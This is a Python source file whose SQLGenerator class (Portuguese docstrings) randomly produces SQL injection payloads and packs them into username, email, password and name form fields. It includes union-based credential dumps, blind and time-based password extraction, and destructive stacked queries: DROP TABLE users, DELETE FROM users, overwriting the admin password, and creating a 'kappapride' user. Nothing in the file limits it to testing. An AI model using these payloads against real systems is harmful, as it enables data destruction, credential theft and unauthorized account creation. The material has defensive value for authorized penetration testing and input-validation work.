import random
from typing import Dict

class SQLGenerator:
    def __init__(self):
        self.basic_attacks = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users; --",
            "' OR '1'='1' /*",
            "admin'--",
            "' OR 1=1#",
            "') OR ('1'='1",
            "' OR 'x'='x",
            "1' OR '1' = '1",
            "1 OR 1=1"
        ]

        self.union_based = [
            "' UNION SELECT username, password FROM users --",
            "' UNION SELECT NULL, table_name FROM information_schema.tables --",
            "' UNION SELECT NULL, column_name FROM information_schema.columns --",
            "' UNION ALL SELECT NULL, NULL, @@version --",
            "' UNION ALL SELECT NULL, NULL FROM users WHERE '1'='1"
        ]

        self.time_based = [
            "'; WAITFOR DELAY '0:0:10'--",
            "'; IF (SELECT COUNT(*) FROM users) > 0 WAITFOR DELAY '0:0:5'--",
            "'; SELECT SLEEP(5)--",
            "'; pg_sleep(10)--",
            "'; DBMS_LOCK.SLEEP(10)--"
        ]

        self.error_based = [
            "' AND 1=CONVERT(int, @@version) --",
            "' AND 1=CTX_DOMAIN.GETMETADATA('SYS_DBURIGEN') --",
            "' AND 1=dbms_pipe.receive_message('RDS', 10) --",
            "' AND UPDATEXML(1, CONCAT('~',(SELECT @@version)), 1) --",
            "' AND extractvalue(1, CONCAT('~',(SELECT @@version))) --"
        ]

        self.blind_based = [
            "' AND 1=1 --",
            "' AND 'a'='a",
            "' AND LENGTH(username)>1 --",
            "' AND ASCII(SUBSTRING(username,1,1))>90 --",
            "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables)='a' --"
        ]

        self.stacked_queries = [
            "'; INSERT INTO users (username,password) VALUES ('kappapride','kappapride'); --",
            "'; UPDATE users SET password='pwned' WHERE username='admin'; --",
            "'; DELETE FROM users WHERE username != 'admin'; --",
            "'; ALTER TABLE users ADD COLUMN kappapride_column varchar(20); --",
            "'; CREATE USER kappapride PASSWORD 'kappapride'; --"
        ]

    def generate_attack(self) -> Dict[str, str]:
        """Gera um ataque SQL injection aleatório"""
        attack_types = [
            self.basic_attacks,
            self.union_based,
            self.time_based,
            self.error_based,
            self.blind_based,
            self.stacked_queries
        ]
        
        attack_list = random.choice(attack_types)
        injection = random.choice(attack_list)
        
        return {
            'username': injection,
            'email': f"{injection}@kappapride.com",
            'password': injection,
            'full_name': injection
        }

    def generate_blind_injection(self) -> Dict[str, str]:
        """Gera um ataque SQL injection cego"""
        template = "' AND (SELECT CASE WHEN ({}) THEN 1 ELSE 0 END)=1 --"
        conditions = [
            "1=1",
            "(SELECT COUNT(*) FROM users)>0",
            "EXISTS(SELECT 1 FROM users WHERE username='admin')",
            "(SELECT TOP 1 LEN(password) FROM users)>5",
            "(SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>50"
        ]
        
        injection = template.format(random.choice(conditions))
        return {
            'username': injection,
            'password': injection
        }

    def generate_time_based(self) -> Dict[str, str]:
        """Gera um ataque SQL injection baseado em tempo"""
        templates = [
            "'; IF ({}) WAITFOR DELAY '0:0:5' --",
            "'; SELECT CASE WHEN ({}) THEN pg_sleep(5) ELSE pg_sleep(0) END --",
            "'; SELECT IF({}, SLEEP(5), SLEEP(0)) --"
        ]
        
        conditions = [
            "1=1",
            "(SELECT COUNT(*) FROM users)>0",
            "DATABASE() = 'production'",
            "(SELECT password FROM users WHERE username='admin') LIKE 'a%'",
            "EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='users')"
        ]
        
        injection = random.choice(templates).format(random.choice(conditions))
        return {
            'username': injection,
            'password': injection
        }

    def generate_union_select(self) -> Dict[str, str]:
        """Gera um ataque UNION SELECT"""
        templates = [
            "' UNION SELECT {}, {} --",
            "' UNION ALL SELECT {}, {} --",
            "') UNION SELECT {}, {} --",
            "') UNION ALL SELECT {}, {} --"
        ]
        
        columns = [
            "username, password",
            "table_name, column_name",
            "NULL, database()",
            "NULL, @@version",
            "@@hostname, @@datadir"
        ]
        
        injection = random.choice(templates).format(*random.choice(columns).split(", "))
        return {
            'username': injection,
            'password': injection
        }

    def generate_error_triggering(self) -> Dict[str, str]:
        """Gera injeções que provocam erros"""
        error_triggers = [
            "' AND 1=CONVERT(int, (SELECT @@version)) --",
            "' AND 1=CAST((SELECT username FROM users) AS int) --",
            "' AND 1=(SELECT 1/0 FROM users) --",
            "' HAVING 1=1 --",
            "' GROUP BY username HAVING 1=1 --",
            "' SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS' --"
        ]
        
        injection = random.choice(error_triggers)
        return {
            'username': injection,
            'password': injection
        }

    def generate_mass_data(self) -> Dict[str, str]:
        """Gera ataques que tentam retornar muitos dados"""
        mass_queries = [
            "' UNION SELECT * FROM users; --",
            "' UNION SELECT * FROM information_schema.tables; --",
            "' UNION SELECT * FROM information_schema.columns; --",
            "' UNION SELECT * FROM pg_catalog.pg_tables; --",
            "' UNION SELECT * FROM sys.objects; --"
        ]
        
        injection = random.choice(mass_queries)
        return {
            'username': injection,
            'password': injection
        }
